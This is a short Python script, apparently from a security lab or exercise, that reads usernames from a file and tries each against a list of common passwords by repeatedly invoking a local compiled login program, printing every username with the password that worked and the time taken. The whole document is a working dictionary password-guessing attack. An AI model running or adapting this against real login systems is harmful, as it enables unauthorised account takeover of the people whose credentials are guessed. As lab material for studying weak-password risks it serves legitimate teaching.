import subprocess
import sys
from time import time

start = time()
print(f"Start time: {start}")
pairs = {}

with open("../gang.txt") as f:
    for name in f:
        name = name.strip()
        pairs[name] = "?"
        with open("../MostCommonPWs.txt") as f:
            for password in f:
                password = password.strip()
                if subprocess.call(["python3", "Login.pyc", name, password]) == 0:
                    pairs[name] = password
                    break
    

    for (name, password) in pairs.items():
        print(f"{name},{password}")


    print(f"End time: {str(time())}")
    print(f"Time taken: {str(time() - start)}s")